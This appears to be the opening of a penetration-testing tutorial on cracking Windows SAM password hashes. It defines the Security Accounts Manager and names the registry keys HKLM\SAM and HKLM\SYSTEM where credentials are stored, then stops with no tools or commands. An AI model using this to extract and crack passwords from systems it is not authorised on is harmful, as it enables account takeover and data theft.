# Crack SAM Hashed Password on a Windows System
The **S**ecurity **A**ccounts **M**anager **(SAM)** is a database file in the Microsoft Windows operating system that contains usernames and passwords.

The primary purpose of the SAM is to make the system more secure and protect from a data breach in case the system is stolen. The SAM is available in different versions of Windows, starting from Windows XP to Windows 11.

Password and user list can be found in the following registry key
    
    HKLM\SAM
    HKLM\SYSTEM
